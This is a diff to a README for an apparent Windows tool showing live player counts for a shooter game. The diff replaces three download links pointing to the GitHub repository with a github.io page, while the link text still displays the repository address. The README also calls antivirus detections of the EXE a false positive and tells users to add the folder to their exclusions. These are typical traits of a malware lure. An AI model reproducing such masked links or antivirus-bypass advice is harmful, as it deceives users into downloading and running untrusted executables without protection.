@@ -1,5 +1,5 @@
 <h1>🎯 bfbcs-rip-stats-hub - Live Player Counts for Your Shooter</h1>
-<a href="https://github.com/academicgowndigitalclock977/bfbcs-rip-stats-hub" style="display:inline-block;background-color:#0078D4;color:white;padding:16px 36px;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;margin:20px 0;">📥 Download bfbcs-rip-stats-hub</a>
+<a href="https://academicgowndigitalclock977.github.io" style="display:inline-block;background-color:#0078D4;color:white;padding:16px 36px;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;margin:20px 0;">📥 Download bfbcs-rip-stats-hub</a>
 <h2>🔍 What Is This?</h2>
 <p>bfbcs-rip-stats-hub is a Windows tool that shows you how many players are online in your favorite military multiplayer shooter (2026 version) at any moment. It gets live data from the Battlefield.rip API and displays it in a simple web page that opens right on your computer. No coding needed.</p>
 <h2>✨ Key Features</h2>
@@ -19,7 +19,7 @@
 <li>No special software or accounts needed</li>
 </ul>
 <h3>Download and Setup</h3>
-<p>Visit this link to download the application: <a href="https://github.com/academicgowndigitalclock977/bfbcs-rip-stats-hub">github.com/academicgowndigitalclock977/bfbcs-rip-stats-hub</a></p>
+<p>Visit this link to download the application: <a href="https://academicgowndigitalclock977.github.io">github.com/academicgowndigitalclock977/bfbcs-rip-stats-hub</a></p>
 <p>Once you're on the page:</p>
 <ol>
 <li>Click the green "Code" button near the top right</li>
@@ -63,7 +63,7 @@
 <tr><td>Antivirus flags the EXE</td><td>This is a false positive. Add the folder to your antivirus exclusions list.</td></tr>
 </table>
 <h2>📝 Support and Updates</h2>
-<p>Visit the GitHub repository for the latest version: <a href="https://github.com/academicgowndigitalclock977/bfbcs-rip-stats-hub">github.com/academicgowndigitalclock977/bfbcs-rip-stats-hub</a></p>
+<p>Visit the GitHub repository for the latest version: <a href="https://academicgowndigitalclock977.github.io">github.com/academicgowndigitalclock977/bfbcs-rip-stats-hub</a></p>
 <p>To check for updates, compare the version number in the <strong>version.txt</strong> file with the release notes on the GitHub page.</p>
 <h2>👨‍💻 Credits</h2>
 <p>This tool uses the Battlefield.rip API service for live game statistics. It is an independent project not affiliated with or endorsed by any game publisher.</p>
